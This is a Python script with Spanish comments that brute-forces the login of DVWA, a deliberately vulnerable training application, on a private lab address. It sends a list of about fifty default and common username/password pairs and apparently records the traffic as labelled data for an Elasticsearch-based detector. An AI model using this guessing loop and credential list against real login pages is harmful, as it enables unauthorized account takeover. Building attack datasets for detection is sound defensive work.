import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS BRUTE FORCE ENTRENAMIENTO MEDIUM
# En nivel medium DVWA anade un sleep() entre intentos
# pero la estructura del ataque es identica.
# DISTINTOS a los de entrenamiento_brute.py (nivel low)
# =============================================

PAYLOADS_BRUTE_MEDIUM = [
    ("admin", "matrix"),
    ("admin", "starwars"),
    ("admin", "liverpool"),
    ("admin", "chelsea"),
    ("admin", "arsenal"),
    ("admin", "barcelona"),
    ("admin", "madrid"),
    ("admin", "juventus"),
    ("admin", "hacker"),
    ("admin", "h4cker"),
    ("admin", "hack3r"),
    ("admin", "p4ssw0rd"),
    ("admin", "s3cr3t"),
    ("admin", "r00t"),
    ("admin", "t00r"),
    ("admin", "4dm1n"),
    ("admin", "adm1n"),
    ("admin", "nimda"),
    ("admin", "passpass"),
    ("admin", "testtest"),
    ("admin", "useruser"),
    ("admin", "rootroot"),
    ("webmaster", "webmaster"),
    ("webmaster", "password"),
    ("webmaster", "web123"),
    ("superuser", "superuser"),
    ("superuser", "password"),
    ("oracle", "oracle"),
    ("oracle", "password"),
    ("postgres", "postgres"),
    ("postgres", "password"),
    ("mysql", "mysql"),
    ("mysql", "password"),
    ("ftp", "ftp"),
    ("ftp", "password"),
    ("ssh", "ssh"),
    ("backup", "backup"),
    ("backup", "password"),
    ("service", "service"),
    ("service", "password"),
    ("support", "support"),
    ("support", "password"),
    ("helpdesk", "helpdesk"),
    ("helpdesk", "password"),
    ("monitor", "monitor"),
    ("monitor", "password"),
    ("nagios", "nagios"),
    ("zabbix", "zabbix"),
    ("splunk", "splunk"),
    ("elastic", "elastic"),
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_brute_medium(session):
    print("\n[*] Iniciando ataques Brute Force MEDIUM...")
    payloads = PAYLOADS_BRUTE_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for usuario, contrasena in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/brute/",
                            params={"username": usuario, "password": contrasena, "Login": "Login"})
            resultado = "EXITO" if "Welcome" in r.text else "fallo"
            print(f"  BRUTE_M | {usuario}:{contrasena:<20} | {resultado} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Brute Force Medium completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: BRUTE FORCE — NIVEL MEDIUM")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'brute'")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_brute_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'brute'")
    print("="*60)
